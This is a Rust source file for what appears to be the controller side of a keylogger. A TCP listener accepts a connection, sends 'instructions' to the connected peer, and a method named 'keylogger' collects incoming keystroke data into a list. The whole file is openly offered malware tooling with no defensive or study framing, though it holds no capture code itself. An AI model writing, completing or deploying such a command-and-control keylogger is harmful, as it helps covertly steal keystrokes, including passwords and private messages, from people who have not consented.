use std::io::prelude::*;
use std::net::{TcpListener, TcpStream, SocketAddr};

pub struct Core {
    stream: TcpStream,
    pub addr: SocketAddr,
    pub keys: Vec<String>,
}

impl Core {
    pub fn new() -> Self {
        let listener = TcpListener::bind("127.0.0.1:7878").unwrap();

        let (stream, addr) = listener
            .accept()
            .unwrap();

        let keys = Vec::new();

        Core {
            stream,
            addr,
            keys,
        }
    }

    pub fn apply_instructions(&mut self, input: String) -> Result<(), std::io::Error> {
        self.stream.write_all(input.as_bytes())?;
        self.stream.flush()?;
        Ok(())
    }

    pub fn keylogger(&mut self) {
        let mut buffer = [0; 512];

        while let Ok(bytes) = self.stream.read(&mut buffer[..]) { 
            if bytes == 0 {
                break;
            }

            if let Ok(key) = std::str::from_utf8(&buffer[..bytes]) {
                self.keys.push(key.to_string());
            }
        }
    }
}
